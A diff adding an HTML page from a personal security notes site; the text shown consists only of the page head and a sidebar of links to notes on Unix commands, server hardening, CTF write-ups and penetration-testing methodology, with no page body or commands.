@@ -1,0 +1,1930 @@
+<!doctype html><html lang=en class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.69.1"><meta name=description content="Notes from Bandit Natasa."><meta name=author content="Justin Perdok"><link rel=icon href=/images/favicon.png type=image/png><title>Natasa :: My notes and snippets</title><link href=/css/nucleus.css rel=stylesheet><link href=/css/fontawesome-all.min.css rel=stylesheet><link href=/css/hybrid.css rel=stylesheet><link href=/css/featherlight.min.css rel=stylesheet><link href=/css/perfect-scrollbar.min.css rel=stylesheet><link href=/css/auto-complete.css rel=stylesheet><link href=/css/atom-one-dark-reasonable.css rel=stylesheet><link href=/css/theme.css rel=stylesheet><link href=/css/hugo-theme.css rel=stylesheet><link href=/css/theme-darkblue.css rel=stylesheet><link href=/css/style.css rel=stylesheet><script src=/js/jquery-3.3.1.min.js></script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/notes/ctfs/overthewire/natasa/><nav id=sidebar><div id=header-wrapper><div id=header><a id=logo href=https://confident-austin-c176a7.netlify.com/></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label><input data-search-input id=search-by type=search placeholder=Search...>
+<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js></script><script type=text/javascript src=/js/auto-complete.js></script><script type=text/javascript>var baseurl="https:\/\/confident-austin-c176a7.netlify.com\/";</script><script type=text/javascript src=/js/search.js></script></div><div class=highlightable><ul class=topics><li data-nav-id=/commands/ title=Commands class=dd-item><a href=/commands/><i class="fas fa-keyboard"></i>Commands</a><ul><li data-nav-id=/commands/unix/ title=Unix class=dd-item><a href=/commands/unix/><i class="fab fa-linux"></i>Unix</a><ul><li data-nav-id=/commands/unix/awk/ title=awk class=dd-item><a href=/commands/unix/awk/><i class="fas fa-terminal"></i>awk</a></li><li data-nav-id=/commands/unix/base64/ title=base64 class=dd-item><a href=/commands/unix/base64/><i class="fas fa-terminal"></i>base64</a></li><li data-nav-id=/commands/unix/bzip2/ title=bzip2 class=dd-item><a href=/commands/unix/bzip2/><i class="fas fa-terminal"></i>bzip2</a></li><li data-nav-id=/commands/unix/cron/ title=cron class=dd-item><a href=/commands/unix/cron/><i class="fas fa-terminal"></i>cron</a></li><li data-nav-id=/commands/unix/curl/ title=curl class=dd-item><a href=/commands/unix/curl/><i class="fas fa-terminal"></i>curl</a></li><li data-nav-id=/commands/unix/cut/ title=cut class=dd-item><a href=/commands/unix/cut/><i class="fas fa-terminal"></i>cut</a></li><li data-nav-id=/commands/unix/file/ title=file class=dd-item><a href=/commands/unix/file/><i class="fas fa-terminal"></i>file</a></li><li data-nav-id=/commands/unix/find/ title=find class=dd-item><a href=/commands/unix/find/><i class="fas fa-terminal"></i>find</a></li><li data-nav-id=/commands/unix/grep/ title=grep class=dd-item><a href=/commands/unix/grep/><i class="fas fa-terminal"></i>grep</a></li><li data-nav-id=/commands/unix/gzip-gunzip-zcat/ title="gzip gunzip zcat" class=dd-item><a href=/commands/unix/gzip-gunzip-zcat/><i class="fas fa-terminal"></i>gzip gunzip zcat</a></li><li data-nav-id=/commands/unix/md5sum/ title=md5sum class=dd-item><a href=/commands/unix/md5sum/><i class="fas fa-terminal"></i>md5sum</a></li><li data-nav-id=/commands/unix/random/ title=random class=dd-item><a href=/commands/unix/random/><i class="fas fa-terminal"></i>random</a></li><li data-nav-id=/commands/unix/rev/ title=rev class=dd-item><a href=/commands/unix/rev/><i class="fas fa-terminal"></i>rev</a></li><li data-nav-id=/commands/unix/scp/ title=scp class=dd-item><a href=/commands/unix/scp/><i class="fas fa-terminal"></i>scp</a></li><li data-nav-id=/commands/unix/sed/ title=sed class=dd-item><a href=/commands/unix/sed/><i class="fas fa-terminal"></i>sed</a></li><li data-nav-id=/commands/unix/sort/ title=sort class=dd-item><a href=/commands/unix/sort/><i class="fas fa-terminal"></i>sort</a></li><li data-nav-id=/commands/unix/strings/ title=strings class=dd-item><a href=/commands/unix/strings/><i class="fas fa-terminal"></i>strings</a></li><li data-nav-id=/commands/unix/tar/ title=tar class=dd-item><a href=/commands/unix/tar/><i class="fas fa-terminal"></i>tar</a></li><li data-nav-id=/commands/unix/touch/ title=touch class=dd-item><a href=/commands/unix/touch/><i class="fas fa-terminal"></i>touch</a></li><li data-nav-id=/commands/unix/tr/ title=tr class=dd-item><a href=/commands/unix/tr/><i class="fas fa-terminal"></i>tr</a></li><li data-nav-id=/commands/unix/uniq/ title=uniq class=dd-item><a href=/commands/unix/uniq/><i class="fas fa-terminal"></i>uniq</a></li><li data-nav-id=/commands/unix/xxd/ title=xxd class=dd-item><a href=/commands/unix/xxd/><i class="fas fa-terminal"></i>xxd</a></li></ul></li></ul></li><li data-nav-id=/guides/ title=Guides class=dd-item><a href=/guides/><i class="fas fa-arrow-alt-circle-right"></i>Guides</a><ul><li data-nav-id=/guides/ubuntu-vps/ title="Ubuntu VPS" class=dd-item><a href=/guides/ubuntu-vps/><i class="fab fa-ubuntu"></i>Ubuntu VPS</a><ul><li data-nav-id=/guides/ubuntu-vps/00-intro/ title="00. Introduction" class=dd-item><a href=/guides/ubuntu-vps/00-intro/>00. Introduction</a></li><li data-nav-id=/guides/ubuntu-vps/01-users/ title="01. Adding users" class=dd-item><a href=/guides/ubuntu-vps/01-users/>01. Adding users</a></li><li data-nav-id=/guides/ubuntu-vps/02-packges/ title="02. Managing of packages" class=dd-item><a href=/guides/ubuntu-vps/02-packges/>02. Managing of packages</a></li><li data-nav-id=/guides/ubuntu-vps/03-vim/ title="03. File editor: vim" class=dd-item><a href=/guides/ubuntu-vps/03-vim/>03. File editor: vim</a></li><li data-nav-id=/guides/ubuntu-vps/04-ufw/ title="04. UFW" class=dd-item><a href=/guides/ubuntu-vps/04-ufw/>04. UFW</a></li><li data-nav-id=/guides/ubuntu-vps/05-ssh-keys/ title="05. SSH Keys" class=dd-item><a href=/guides/ubuntu-vps/05-ssh-keys/>05. SSH Keys</a></li><li data-nav-id=/guides/ubuntu-vps/06-setup-sshd/ title="06. Setup sshd" class=dd-item><a href=/guides/ubuntu-vps/06-setup-sshd/>06. Setup sshd</a></li><li data-nav-id=/guides/ubuntu-vps/07-unattended-upgrades/ title="07. Unattended Upgrades" class=dd-item><a href=/guides/ubuntu-vps/07-unattended-upgrades/>07. Unattended Upgrades</a></li><li data-nav-id=/guides/ubuntu-vps/08-fail2ban/ title="08. Fail2ban" class=dd-item><a href=/guides/ubuntu-vps/08-fail2ban/>08. Fail2ban</a></li><li data-nav-id=/guides/ubuntu-vps/09-logwatch/ title="09. Logwatch" class=dd-item><a href=/guides/ubuntu-vps/09-logwatch/>09. Logwatch</a></li><li data-nav-id=/guides/ubuntu-vps/10-sysctl-optimization/ title="10. Sysctl Optimization" class=dd-item><a href=/guides/ubuntu-vps/10-sysctl-optimization/>10. Sysctl Optimization</a></li></ul></li></ul></li><li data-nav-id=/notes/ title=Notes class=dd-item><a href=/notes/><i class="fas fa-book-reader"></i>Notes</a><ul><li data-nav-id=/notes/courses/ title=Courses class=dd-item><a href=/notes/courses/><i class="fas fa-school"></i>Courses</a></li><li data-nav-id=/notes/ctfs/ title=CTFs class=dd-item><a href=/notes/ctfs/><i class="fas fa-flag"></i>CTFs</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/ title="Graficom Spoorzoeker" class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/><i class="fas fa-folder"></i>Graficom Spoorzoeker</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/challanges/ title=Challanges class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/challanges/><i class="fas fa-question-circle"></i>Challanges</a></li><li data-nav-id=/notes/ctfs/graficomspoorzoeker/solutions/ title=Solutions class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/solutions/><i class="fas fa-check-circle"></i>Solutions</a></li></ul></li><li data-nav-id=/notes/ctfs/htb/ title=HTB class=dd-item><a href=/notes/ctfs/htb/><i class="fas fa-folder"></i>HTB</a><ul><li data-nav-id=/notes/ctfs/htb/bashed/ title=Bashed class=dd-item><a href=/notes/ctfs/htb/bashed/><i class="fas fa-server"></i>Bashed</a></li><li data-nav-id=/notes/ctfs/htb/blue/ title=Blue class=dd-item><a href=/notes/ctfs/htb/blue/><i class="fas fa-server"></i>Blue</a></li><li data-nav-id=/notes/ctfs/htb/devel/ title=Devel class=dd-item><a href=/notes/ctfs/htb/devel/><i class="fas fa-server"></i>Devel</a></li><li data-nav-id=/notes/ctfs/htb/grandpa/ title=Grandpa class=dd-item><a href=/notes/ctfs/htb/grandpa/><i class="fas fa-server"></i>Grandpa</a></li><li data-nav-id=/notes/ctfs/htb/granny/ title=Granny class=dd-item><a href=/notes/ctfs/htb/granny/><i class="fas fa-server"></i>Granny</a></li><li data-nav-id=/notes/ctfs/htb/jerry/ title=Jerry class=dd-item><a href=/notes/ctfs/htb/jerry/><i class="fas fa-server"></i>Jerry</a></li><li data-nav-id=/notes/ctfs/htb/lame/ title=Lame class=dd-item><a href=/notes/ctfs/htb/lame/><i class="fas fa-server"></i>Lame</a></li><li data-nav-id=/notes/ctfs/htb/legacy/ title=Legacy class=dd-item><a href=/notes/ctfs/htb/legacy/><i class="fas fa-server"></i>Legacy</a></li><li data-nav-id=/notes/ctfs/htb/metmon/ title=Netmon class=dd-item><a href=/notes/ctfs/htb/metmon/><i class="fas fa-server"></i>Netmon</a></li><li data-nav-id=/notes/ctfs/htb/nibbles/ title=Nibbles class=dd-item><a href=/notes/ctfs/htb/nibbles/><i class="fas fa-server"></i>Nibbles</a></li><li data-nav-id=/notes/ctfs/htb/optimum/ title=Optimum class=dd-item><a href=/notes/ctfs/htb/optimum/><i class="fas fa-server"></i>Optimum</a></li></ul></li><li data-nav-id=/notes/ctfs/overthewire/ title=OverTheWire class="dd-item
+parent"><a href=/notes/ctfs/overthewire/><i class="fas fa-folder"></i>OverTheWire</a><ul><li data-nav-id=/notes/ctfs/overthewire/bandit/ title=Bandit class=dd-item><a href=/notes/ctfs/overthewire/bandit/><i class="fas fa-layer-group"></i>Bandit</a></li><li data-nav-id=/notes/ctfs/overthewire/natasa/ title=Natasa class="dd-item active"><a href=/notes/ctfs/overthewire/natasa/><i class="fas fa-layer-group"></i>Natasa</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/ title=VulnHub class=dd-item><a href=/notes/ctfs/vulnhub/><i class="fas fa-folder"></i>VulnHub</a><ul><li data-nav-id=/notes/ctfs/vulnhub/fristileaks/ title=Fristileaks class=dd-item><a href=/notes/ctfs/vulnhub/fristileaks/><i class="fas fa-folder"></i>Fristileaks</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/ title=Kioptrix class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/><i class="fas fa-folder"></i>Kioptrix</a><ul><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level1/ title="Level 1" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level1/><i class="fas fa-layer-group"></i>Level 1</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level2/ title="Level 2" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level2/><i class="fas fa-layer-group"></i>Level 2</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level3/ title="Level 3" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level3/><i class="fas fa-layer-group"></i>Level 3</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level4/ title="Level 4" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level4/><i class="fas fa-layer-group"></i>Level 4</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/pwnlab/ title=Pwnlab class=dd-item><a href=/notes/ctfs/vulnhub/pwnlab/><i class="fas fa-folder"></i>Pwnlab</a></li><li data-nav-id=/notes/ctfs/vulnhub/stapler/ title=Stapler class=dd-item><a href=/notes/ctfs/vulnhub/stapler/><i class="fas fa-folder"></i>Stapler</a></li><li data-nav-id=/notes/ctfs/vulnhub/vulnix/ title=Vulnix class=dd-item><a href=/notes/ctfs/vulnhub/vulnix/><i class="fas fa-folder"></i>Vulnix</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnserver/ title=Vulnserver class=dd-item><a href=/notes/ctfs/vulnserver/><i class="fas fa-folder"></i>Vulnserver</a><ul><li data-nav-id=/notes/ctfs/vulnserver/trun/ title=TRUN class=dd-item><a href=/notes/ctfs/vulnserver/trun/><i class="fas fa-layer-group"></i>TRUN</a></li></ul></li></ul></li><li data-nav-id=/notes/exploit-development/ title="Exploit Development" class=dd-item><a href=/notes/exploit-development/><i class="fas fa-biohazard"></i>Exploit Development</a><ul><li data-nav-id=/notes/exploit-development/buffer-overflow/ title="Buffer Overflow" class=dd-item><a href=/notes/exploit-development/buffer-overflow/><i class="fas fa-layer-group"></i>Buffer Overflow</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/ title="Hacking Methodology" class=dd-item><a href=/notes/todo-hacking-methodology/><i class="fas fa-road"></i>Hacking Methodology</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/ title="01. Reconnaissance" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/>01. Reconnaissance</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/ title="Credential Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/>Credential Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/ title="DNS Recon" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/>DNS Recon</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/e-mail-gathering/ title="E-Mail Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/e-mail-gathering/>E-Mail Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/ title="Google Dorking" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/>Google Dorking</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/identify-website-technologies/ title="Identify Website Technologies" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/identify-website-technologies/>Identify Website Technologies</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/social-media/ title="Social Media" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/social-media/>Social Media</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/ title="02. Scanning and Enumeration" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/>02. Scanning and Enumeration</a><ul><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/ title="Discover Open Ports" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/>Discover Open Ports</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/ title=Finger class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/>Finger</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/ title=NFS class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/>NFS</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/ title=searchsploit class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/>searchsploit</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/ title=smb class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/>smb</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/ title=smtp class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/>smtp</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/ title=Web class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/>Web</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/ title="03. Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/>03. Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ title="Active Directory" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/>Active Directory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ title="Attack Tools" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/>Attack Tools</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/ title=mitm6 class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/>mitm6</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/ title=ntlmrelayx class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/>ntlmrelayx</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/ title=psexec class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/>psexec</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/ title=responder class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/>responder</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/ title="IPv6 DNS Takeover" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/>IPv6 DNS Takeover</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/ title="LLMNR and NBT-NS" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/>LLMNR and NBT-NS</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/ title="SMB Relay" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/>SMB Relay</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/ title=WPAD class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/>WPAD</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/credential-stuffing/ title="Credential Stuffing" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/credential-stuffing/>Credential Stuffing</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/hydra/ title=Hydra class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/hydra/>Hydra</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/password-spraying/ title="Password Spraying" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/password-spraying/>Password Spraying</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/redis/ title=Redis class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/redis/>Redis</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/ title=Shells class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/>Shells</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/ title=msfvenom class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/>msfvenom</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/ title=payloads class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/>payloads</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/sql-injection/ title="SQL Injection" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/sql-injection/>SQL Injection</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/ title="04. Post Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/>04. Post Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/ title=activedirectory class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/>activedirectory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/ title=credentialaccess class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/>credentialaccess</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/ title=powerview class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/>powerview</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/ title="encrypted password protected pdf" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/>encrypted password protected pdf</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/ title="encrypted password protected zip" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/>encrypted password protected zip</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/ title="hash identifier" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/>hash identifier</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/ title=hashcat class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/>hashcat</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/ title="priv esc" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/>priv esc</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/ title="shell escaping" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/>shell escaping</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/ title=unshadow class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/>unshadow</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/ title="wpadmin plugin upload" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/>wpadmin plugin upload</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/05-cleanup/ title="05. Cleanup" class=dd-item><a href=/notes/todo-hacking-methodology/05-cleanup/>05. Cleanup</a></li></ul></li><li data-nav-id=/notes/networking/ title=Networking class=dd-item><a href=/notes/networking/><i class="fas fa-network-wired"></i>Networking</a><ul><li data-nav-id=/notes/networking/osi-model/ title="OSI Model" class=dd-item><a href=/notes/networking/osi-model/><i class="fas fa-ethernet"></i>OSI Model</a><ul><li data-nav-id=/notes/networking/osi-model/layer1/ title="Layer 1" class=dd-item><a href=/notes/networking/osi-model/layer1/><i class="fas fa-ethernet"></i>Layer 1</a></li><li data-nav-id=/notes/networking/osi-model/layer2/ title="Layer 2" class=dd-item><a href=/notes/networking/osi-model/layer2/><i class="fas fa-ethernet"></i>Layer 2</a></li><li data-nav-id=/notes/networking/osi-model/layer3/ title="Layer 3" class=dd-item><a href=/notes/networking/osi-model/layer3/><i class="fas fa-ethernet"></i>Layer 3</a></li><li data-nav-id=/notes/networking/osi-model/layer4/ title="Layer 4" class=dd-item><a href=/notes/networking/osi-model/layer4/><i class="fas fa-ethernet"></i>Layer 4</a></li><li data-nav-id=/notes/networking/osi-model/layer5/ title="Layer 5" class=dd-item><a href=/notes/networking/osi-model/layer5/><i class="fas fa-ethernet"></i>Layer 5</a></li><li data-nav-id=/notes/networking/osi-model/layer6/ title="Layer 6" class=dd-item><a href=/notes/networking/osi-model/layer6/><i class="fas fa-ethernet"></i>Layer 6</a></li><li data-nav-id=/notes/networking/osi-model/layer7/ title="Layer 7" class=dd-item><a href=/notes/networking/osi-model/layer7/><i class="fas fa-ethernet"></i>Layer 7</a></li></ul></li><li data-nav-id=/notes/networking/tcpip-model/ title="TCP/IP Model" class=dd-item><a href=/notes/networking/tcpip-model/><i class="fas fa-ethernet"></i>TCP/IP Model</a></li></ul></li><li data-nav-id=/notes/programming/ title=Programming class=dd-item><a href=/notes/programming/><i class="fas fa-code"></i>Programming</a><ul><li data-nav-id=/notes/programming/bash/ title=Bash class=dd-item><a href=/notes/programming/bash/><i class="fas fa-layer-group"></i>Bash</a></li><li data-nav-id=/notes/programming/docker-compose/ title=Docker-Compose class=dd-item><a href=/notes/programming/docker-compose/><i class="fas fa-layer-group"></i>Docker-Compose</a></li><li data-nav-id=/notes/programming/dockerfile/ title=Dockerfile class=dd-item><a href=/notes/programming/dockerfile/><i class="fas fa-layer-group"></i>Dockerfile</a></li><li data-nav-id=/notes/programming/markdown/ title=Markdown class=dd-item><a href=/notes/programming/markdown/><i class="fas fa-layer-group"></i>Markdown</a></li><li data-nav-id=/notes/programming/mysql/ title=MySQL class=dd-item><a href=/notes/programming/mysql/><i class="fas fa-layer-group"></i>MySQL</a></li><li data-nav-id=/notes/programming/python/ title=Python class=dd-item><a href=/notes/programming/python/><i class="fas fa-layer-group"></i>Python</a></li></ul></li><li data-nav-id=/notes/z_private/ title=Z_Private class=dd-item><a href=/notes/z_private/><i class="fas fa-lock"></i>Private</a></li></ul></li><li data-nav-id=/tools/ title=Tools class=dd-item><a href=/tools/><i class="fas fa-tools"></i>Tools</a><ul><li data-nav-id=/tools/00-forensic/ title=00-Forensic class=dd-item><a href=/tools/00-forensic/><i class="fas fa-folder"></i>Forensic</a><ul><li data-nav-id=/tools/00-forensic/exiftool/ title=exiftool class=dd-item><a href=/tools/00-forensic/exiftool/><i class="fas fa-wrench"></i>exiftool</a></li><li data-nav-id=/tools/00-forensic/ssh-sha256-to-public-key/ title="ssh sha256 to public key" class=dd-item><a href=/tools/00-forensic/ssh-sha256-to-public-key/><i class="fas fa-wrench"></i>ssh sha256 to public key</a></li><li data-nav-id=/tools/00-forensic/usbrip/ title=usbrip class=dd-item><a href=/tools/00-forensic/usbrip/><i class="fas fa-wrench"></i>usbrip</a></li></ul></li><li data-nav-id=/tools/00-frameworks/ title=00-Frameworks class=dd-item><a href=/tools/00-frameworks/><i class="fas fa-folder"></i>Frameworks</a><ul><li data-nav-id=/tools/00-frameworks/empire/ title=empire class=dd-item><a href=/tools/00-frameworks/empire/><i class="fas fa-wrench"></i>empire</a></li><li data-nav-id=/tools/00-frameworks/metasploit/ title=metasploit class=dd-item><a href=/tools/00-frameworks/metasploit/><i class="fas fa-wrench"></i>metasploit</a></li></ul></li><li data-nav-id=/tools/00-steganography/ title=00-Steganography class=dd-item><a href=/tools/00-steganography/><i class="fas fa-folder"></i>Steganography</a><ul><li data-nav-id=/tools/00-steganography/binwalk/ title=binwalk class=dd-item><a href=/tools/00-steganography/binwalk/><i class="fas fa-wrench"></i>binwalk</a></li><li data-nav-id=/tools/00-steganography/foremost/ title=foremost class=dd-item><a href=/tools/00-steganography/foremost/><i class="fas fa-wrench"></i>foremost</a></li><li data-nav-id=/tools/00-steganography/steghide/ title=steghide class=dd-item><a href=/tools/00-steganography/steghide/><i class="fas fa-wrench"></i>steghide</a></li></ul></li><li data-nav-id=/tools/amass/ title=amass class=dd-item><a href=/tools/amass/><i class="fas fa-wrench"></i>amass</a></li><li data-nav-id=/tools/h8mail/ title=h8mail class=dd-item><a href=/tools/h8mail/><i class="fas fa-wrench"></i>h8mail</a></li><li data-nav-id=/tools/nc/ title=nc class=dd-item><a href=/tools/nc/><i class="fas fa-wrench"></i>nc</a></li><li data-nav-id=/tools/nmap/ title=Nmap class=dd-item><a href=/tools/nmap/><i class="fas fa-wrench"></i>Nmap</a></li><li data-nav-id=/tools/openssl/ title=openssl class=dd-item><a href=/tools/openssl/><i class="fas fa-wrench"></i>openssl</a><ul><li data-nav-id=/tools/openssl/s_client/ title=s_client class=dd-item><a href=/tools/openssl/s_client/><i class="fas fa-wrench"></i>s_client</a></li></ul></li><li data-nav-id=/tools/psdnsdumpsterapi/ title=PSDNSDumpsterAPI class=dd-item><a href=/tools/psdnsdumpsterapi/><i class="fas fa-wrench"></i>PSDNSDumpsterAPI</a></li><li data-nav-id=/tools/sublist3r/ title=sublist3r class=dd-item><a href=/tools/sublist3r/><i class="fas fa-wrench"></i>sublist3r</a></li><li data-nav-id=/tools/theharvester/ title=theHarvester class=dd-item><a href=/tools/theharvester/><i class="fas fa-wrench"></i>theHarvester</a></li><li data-nav-id=/tools/tmux/ title=tmux class=dd-item><a href=/tools/tmux/><i class="fas fa-wrench"></i>tmux</a></li><li data-nav-id=/tools/whatweb/ title=whatweb class=dd-item><a href=/tools/whatweb/><i class="fas fa-wrench"></i>whatweb</a></li></ul></li></ul><section id=shortcuts><h3>More</h3><ul><li><a class=padding href=https://github.com/justin-p/><i class="fab fa-github"></i>Github</a></li><li><a class=padding href=https://justin-p.me/><i class="fas fa-kiss-wink-heart"></i>Blog</a></li><li><a class=padding href=https://twitter.com/JustinPerdok><i class="fab fa-twitter"></i>Twitter</a></li><li><a class=padding href=https://www.linkedin.com/in/justinperdok/><i class="fab fa-linkedin-in"></i>LinkedIn</a></li></ul></section><section id=footer><p>Built with
+<a href=https://github.com/matcornic/hugo-theme-learn>Hugo Learn</a>
+and
